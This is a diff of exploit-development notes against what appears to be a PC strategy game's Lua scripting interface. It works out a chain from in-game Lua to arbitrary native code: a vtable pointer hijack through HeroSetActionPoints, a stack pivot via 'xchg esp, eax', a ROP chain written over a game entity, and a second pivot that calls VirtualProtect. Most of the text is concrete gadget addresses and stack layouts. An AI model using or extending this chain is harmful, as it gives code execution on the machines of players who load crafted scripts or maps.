@@ -1,29 +1,41 @@
-call via modified vtable
+Via modified entity vtable pointer, it is possible to run an existing fragment
+that has an existing pointer to it.
+We use @4020E6 ("call esi"), since esi can be controlled using the lua argument2 to HeroSetActionPoints
+This way, we can execute fragment @72B479h, which does not have an existing pointer to it.
+This fragment pivots esp to a ROP chain written over the game entity.
 
-hookBase: 0A20000h
+Currently we use XD_Plant1 which is a CGLEEntity, so the loader is limited to 264 bytes.
 
+alternative object sizes: 
+	CGLEEntity:	264 byte
+	CAnimal:	304 byte
+	CBuilding:	332 byte
+	CSettler:	548 byte
 
 
 HeroSetActionPoints @4D9087
 	mov esi, lua_arg2
-	call [edx (vtable) + 40h] = call 4020E6, ret @4D90CB
+	push &EventValue
+	call [edx (vtable) + 40h] = call 4020E6, ret4 @4D90CB
 
-@4020E6
-	push 7D03
+cursor function fragment, but importantly, has "call esi" 
+ and has a absolute reference to it (the value 4020E6 is already in memory)
+@4020E6 
+	push 7F03
 	push 0
-	call esi = call 72B479, ret @4020EF
+	call esi = call 72B479, ret @4020EF (do not return here)
 
-@72B479
+@esi=72B479h
 	xchg esp, eax
 	pop edi
 	ret
 	
 	
 
-fake stack:
+fake stack written over entity obj:
 	402100h (fake vtable) -> edi
 	40FCB5h
-	eID
+	eID DO NOT OVERRIDE
 	58A6CFh REPLACED with original ESP!!
 	...
 	47179Dh jmp [eax] = jmp dword [hookBase]
@@ -33,14 +45,18 @@ fake stack:
 
 
 actual stack:
-	4020EF <- esp saved to eax, 
+	4020EF <- esp at this position is swapped to eax and stored 
 	0
 	7F03
-	4D90CB
+	4D90CB <- return here to HeroSetActionPoints with ret 4
 
 
 
-virtualProtect double pivot:
+
+Later, we set up a secondary ROP chain on the normal stack, 
+pivot to it, execute VirtualProtect, and pivot back to the original ROP chain.
+
+Start with:
 		dd 72B479h		;xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
 		
 @eax:	dd dummy
@@ -54,7 +70,9 @@ virtualProtect double pivot:
 		dd 40142Bh          ; pop eax ; ret
         dd esp_back
         dd 72B479h			;xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
-		
+
+copy instructions:
+
 0x0042e17f : mov dword ptr [eax + 4], ecx ; ret
 0x00490654 : mov dword ptr [eax + 8], ecx ; ret
 0x004848d0 : mov dword ptr [eax + 0xc], ecx ; ret
@@ -67,11 +85,3 @@ virtualProtect double pivot:
 0x004493d5 : mov dword ptr [eax + 0x28], ecx ; ret
 0x004f8dde : mov dword ptr [eax + 0x2c], ecx ; ret
 0x005d9d03 : mov dword ptr [eax + 0x30], ecx ; ret
-
-0x0040bb30 : add eax, 0x30 ; ret
-
-: mov dword ptr [eax + 0x14], ecx ; ret
-0x0040235f : mov dword ptr [eax + 0x20], ecx ; ret
-
-0x00595842 : add eax, esp ; pop edi ; js 0x59584c ; ret
-0x0051296e : xor edi, esp ; push ecx ; push edx ; ret 4
